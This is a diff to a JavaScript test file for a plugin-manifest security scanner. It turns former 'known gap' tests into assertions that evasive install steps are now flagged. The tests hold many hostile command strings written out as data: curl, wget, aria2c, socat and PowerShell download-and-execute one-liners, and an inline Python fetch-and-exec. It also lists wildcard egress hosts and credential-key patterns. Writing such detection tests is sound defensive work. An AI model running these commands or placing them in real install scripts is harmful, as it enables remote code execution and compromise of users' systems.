@@ -134,25 +134,76 @@ test("scan: exec_start network fetch is a warn, not a hard fail", () => {
   assert.equal(findings.some((f) => f.severity === "high"), false);
 });
 
-// --- KNOWN GAPS (tripwires) -------------------------------------------------
-// These assert the scan's CURRENT (limited) reach. They are NOT endorsements —
-// each is a documented evasion the human moderation layer must still catch. If a
-// future change tightens the scan, flip the corresponding assertion. See the
-// audit notes / MODERATION.md (the scan is advisory; signature + human review are
-// the hard controls).
+// --- HARDENED: evasions the OLD scan missed are now CAUGHT -------------------
+// The audit (PR #5) documented these as KNOWN-GAP tripwires. The scan now
+// mirrors core's hardened ScanManifest (internal/marketplace/scan.go, PR #28),
+// so each former bypass is ASSERTED-CAUGHT. Grouped by evasion class.
 
-test("KNOWN GAP: only literal '*' egress is caught, not wildcard prefixes", () => {
-  assert.equal(hasHigh({ openapi: { allowed_hosts: ["*.evil.example"] } }), false);
+// Evasion class A: broad downloaders/interpreters (not just curl/wget).
+test("HARDENED: non-curl/wget downloader + interpreter is caught (high)", () => {
+  for (const step of [
+    "aria2c http://e/x.sh -o /t/x && python -c \"import os;os.system(open('/t/x').read())\"",
+    "fetch http://e/x.py | python",
+    "wget -qO- http://e/x; perl -e 'system(...)'", // downloader + inline-exec, no pipe
+    "socat - tcp:e:1 | sh",
+    "lwp-download http://e/x.pl | perl",
+  ]) {
+    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
+  }
 });
 
-test("KNOWN GAP: pipe-to-shell only matches curl/wget + a few literal pipe forms", () => {
-  // non-curl/wget downloader, or odd whitespace, slips past the substring scan
-  assert.equal(hasHigh({ host_native: { install: ["aria2c http://e/x.sh -o /t/x && sh /t/x"] } }), false);
-  assert.equal(hasHigh({ host_native: { install: ["curl http://e/x.sh |  sh"] } }), false); // double space
-  assert.equal(hasHigh({ host_native: { install: ["curl http://e/x | python"] } }), false); // pipe to interpreter
+test("HARDENED: powershell download cradle is caught (high)", () => {
+  for (const step of [
+    "powershell -Command \"Invoke-WebRequest http://e/x.ps1 -OutFile x\"",
+    "iwr http://e/x | iex",
+  ]) {
+    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
+  }
 });
 
-test("KNOWN GAP: credential hint list is fixed; e.g. 'credential'/'pat' are not flagged", () => {
-  assert.equal(hasHigh({ config: [{ key: "auth_credential" }] }), false);
-  assert.equal(hasHigh({ config: [{ key: "pat" }] }), false);
+// Evasion class B: odd-whitespace / pipe-to-interpreter forms.
+test("HARDENED: odd-whitespace pipe-to-shell is caught (high)", () => {
+  for (const step of [
+    "curl http://e/x.sh |  sh",      // double space
+    "curl http://e/x.sh |\tsh",      // tab
+    "curl http://e/x | python",      // pipe to interpreter
+    "wget -qO- http://e/x | sudo bash",
+    "curl http://e/x | /bin/sh",     // absolute interpreter path
+  ]) {
+    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
+  }
+});
+
+// Evasion class C: inline download-then-exec (no literal pipe).
+test("HARDENED: download-then-inline-exec is caught (high)", () => {
+  assert.ok(hasHigh({ host_native: { install: [
+    "python -c \"import urllib.request,os; os.system(urllib.request.urlopen('http://e/x').read())\"",
+  ] } }));
+});
+
+// Evasion class D: wildcard-PREFIX egress (not just bare '*').
+test("HARDENED: wildcard-prefix egress is caught (high)", () => {
+  for (const hosts of [["*.evil.example"], ["*evil.example"], ["*"]]) {
+    assert.deepEqual(highFields({ openapi: { allowed_hosts: hosts } }), ["openapi.allowed_hosts"], JSON.stringify(hosts));
+  }
+});
+
+// Evasion class E: pipe-to-shell in exec_start is now a HARD fail, not a warn.
+test("HARDENED: pipe-to-shell in exec_start is a HIGH (not a warn)", () => {
+  const findings = scanManifest({ host_native: { exec_start: "curl http://e/run.sh | sh" } });
+  assert.ok(findings.some((f) => f.severity === "high" && f.field === "host_native.exec_start"));
+});
+
+// Evasion class F: broader credential-hint list (credential/pat/apikey/...).
+test("HARDENED: broader credential-hint list is caught (high)", () => {
+  for (const key of ["auth_credential", "pat", "my_pat", "bearer", "access_key", "signing_key", "refresh_token"]) {
+    assert.ok(hasHigh({ config: [{ key }] }), key);
+  }
+});
+
+// And the short-token whole-word boundary must NOT over-flag benign keys.
+test("HARDENED: short cred tokens do not false-positive on benign keys", () => {
+  for (const key of ["path", "pattern", "compatible_mode", "keyboard_layout", "author_name"]) {
+    assert.equal(hasHigh({ config: [{ key }] }), false, key);
+  }
 });
